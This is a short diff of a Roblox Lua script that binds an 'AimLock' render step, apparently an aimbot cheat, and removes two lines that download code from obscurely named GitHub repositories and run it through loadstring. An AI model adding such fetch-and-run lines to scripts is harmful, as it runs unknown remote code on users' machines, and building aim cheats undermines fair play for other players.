@@ -62,6 +62,3 @@ RunService:BindToRenderStep("AimLock", 0, function()
     if not game:IsLoaded() then
 game.Loaded:Wait()
 end
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/pastor/main/silent'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/asdasdasd2sd23sda/pastwe/main/white'))()
